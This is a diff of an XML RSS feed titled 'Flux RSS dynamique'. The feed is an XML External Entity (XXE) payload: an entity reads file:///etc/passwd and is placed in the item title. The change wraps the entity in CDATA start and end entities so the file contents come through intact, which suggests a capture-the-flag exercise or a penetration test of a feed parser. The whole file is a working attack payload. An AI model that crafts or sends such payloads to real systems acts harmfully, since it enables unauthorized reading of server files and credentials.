@@ -1,11 +1,20 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [<!ENTITY article SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE rss [
+  <!ENTITY article SYSTEM "file:///etc/passwd">
+  <!ENTITY cdata_start "<![CDATA[">
+  <!ENTITY cdata_end "]]>">
+]>
 <rss version="2.0">
   <channel>
     <title>Flux RSS dynamique</title>
-    <description>Flux RSS avec contenu externe</description>
+    <description>Flux RSS avec article dynamique</description>
     <item>
-      <title>&article;</title>
+      <title>&cdata_start;&article;&cdata_end;</title>
+      <link>google.com</link>
+      <description>
+        description
+      </description>
     </item>
+
   </channel>
 </rss>
